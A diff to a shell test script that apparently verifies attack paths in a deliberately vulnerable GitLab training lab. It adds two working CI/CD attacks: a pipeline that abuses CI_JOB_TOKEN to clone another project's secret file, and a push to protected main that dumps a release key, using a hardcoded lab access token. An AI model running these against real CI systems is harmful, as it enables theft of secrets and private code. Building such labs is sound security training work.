@@ -385,6 +385,51 @@ YML
   chk ppe_2 ppe_2-fork-mr-secret-exfil "$out"
 fi
 
+# --- pbac_1: a web-store CI job uses its CI_JOB_TOKEN to clone another project (allowlist off) ----
+if enabled pbac_1; then
+  on runner 'rm -f /tmp/pbac1-proof' >/dev/null 2>&1
+  W=$(mktemp -d)
+  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
+  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
+stages: [x]
+steal:
+  stage: x
+  tags: [shell]
+  script:
+    - git clone http://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.minilab2.lab/beta/infra-beta.git /tmp/pbac1-clone
+    - cat /tmp/pbac1-clone/CROWN.md > /tmp/pbac1-proof
+YML
+  ( cd "$W/ws"; git -c user.email=atk@x -c user.name=atk checkout -q -B jobtoken
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m ci
+    git -c user.email=atk@x -c user.name=atk push -q -f origin jobtoken ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'rm -rf /tmp/pbac1-clone; for i in $(seq 1 60); do [ -s /tmp/pbac1-proof ] && break; sleep 3; done; cat /tmp/pbac1-proof 2>/dev/null')
+  chk pbac_1 pbac_1-cijobtoken-crossproject "$out"
+fi
+
+# --- pbac_3: push directly to protected main -> protected release secret is in scope ----
+if enabled pbac_3; then
+  on runner 'rm -f /tmp/pbac3-proof' >/dev/null 2>&1
+  W=$(mktemp -d)
+  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
+  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
+stages: [release]
+release:
+  stage: release
+  tags: [shell]
+  script:
+    - echo "$RELEASE_KEY" > /tmp/pbac3-proof
+YML
+  ( cd "$W/ws"; git -c user.email=atk@x -c user.name=atk checkout -q main 2>/dev/null || git -c user.email=atk@x -c user.name=atk checkout -q -B main
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "release pipeline"
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/pbac3-proof ] && break; sleep 3; done; cat /tmp/pbac3-proof 2>/dev/null')
+  chk pbac_3 pbac_3-branch-protection-bypass "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
